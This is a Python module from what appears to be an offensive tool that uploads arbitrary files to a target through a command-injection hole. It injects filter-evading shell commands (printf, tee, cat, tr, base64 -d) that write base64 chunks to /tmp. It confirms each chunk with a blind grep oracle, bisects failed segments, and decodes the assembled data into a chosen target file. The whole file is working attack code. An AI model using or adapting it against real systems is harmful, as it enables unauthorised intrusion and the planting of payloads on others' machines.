"""Reliable file transfer over the injection channel."""

from __future__ import annotations

import base64
import time

from .inject import I

CHUNK = 48
MAX_TRIES = 4


def to_b64url(data: bytes) -> str:
    return base64.b64encode(data).decode().replace("+", "-").replace("/", "_")


def chunk_text(text: str, size: int = CHUNK) -> list[str]:
    return [text[i:i + size] for i in range(0, len(text), size)]


def push_data(inj, data: bytes, tag: str) -> list[str]:
    """Write data as verified b64url part files; return ordered part paths."""
    b64 = to_b64url(data)
    inj.do(f"rm{I}-f{I}/tmp/nxseg_{tag}_*")
    parts: list[str] = []
    for n, chunk in enumerate(chunk_text(b64)):
        parts += _write_segment(inj, chunk, f"/tmp/nxseg_{tag}_{n:03d}")
    return parts


def _write_segment(inj, seg: str, part: str, depth: int = 0) -> list[str]:
    # grep -qFx matches the WHOLE line: the file has no trailing newline, so
    # an exact full-line match proves content and length in one oracle call.
    for attempt in range(MAX_TRIES):
        inj.do(f"printf{I}%s{I}{seg}|tee{I}{part}")
        time.sleep(0.4)
        if inj.ask(f"grep{I}-qFx{I}{seg}{I}{part}"):
            inj.log(f"[transfer] {part} ok ({len(seg)} chars)")
            return [part]
        inj.log(f"[transfer] {part} attempt {attempt + 1} failed")
    if depth >= 6 or len(seg) <= 2:
        raise RuntimeError(f"segment too stubborn: {seg!r}")
    mid = len(seg) // 2
    inj.log(f"[transfer] bisecting segment of {len(seg)} chars")
    return (_write_segment(inj, seg[:mid], part + "a", depth + 1)
            + _write_segment(inj, seg[mid:], part + "b", depth + 1))


def assemble(inj, parts: list[str], target: str) -> None:
    """cat parts | tr '_-' '/+' | base64 -d | tee target (grouped, short cmds)."""
    groups = [parts[i:i + 6] for i in range(0, len(parts), 6)]
    temps = []
    for gi, g in enumerate(groups):
        tmp = f"/tmp/nxg_{gi}"
        inj.do(f"cat{I}" + " ".join(g) + f"|tee{I}{tmp}")
        temps.append(tmp)
    inj.do(f"cat{I}" + " ".join(temps)
           + f"|tr{I}'_-'{I}'/+'|base64{I}-d|tee{I}{target}")
    time.sleep(0.5)
